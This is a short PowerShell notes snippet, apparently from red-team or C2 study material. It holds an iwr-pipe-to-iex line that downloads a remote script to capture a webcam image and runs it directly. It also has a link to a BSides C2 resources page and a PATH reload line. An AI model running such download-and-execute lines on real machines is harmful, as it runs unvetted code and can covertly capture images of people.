
# Save webcam image
# https://github.com/stefanstranger/PowerShell/blob/master/Get-WebCamp.ps1
iwr https://raw.githubusercontent.com/stefanstranger/PowerShell/master/Get-WebCamp.ps1 | iex

# Resources

# https://aptmasterclass.com/bsides19/BSides19-C2-sources.html
# Reload env
$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
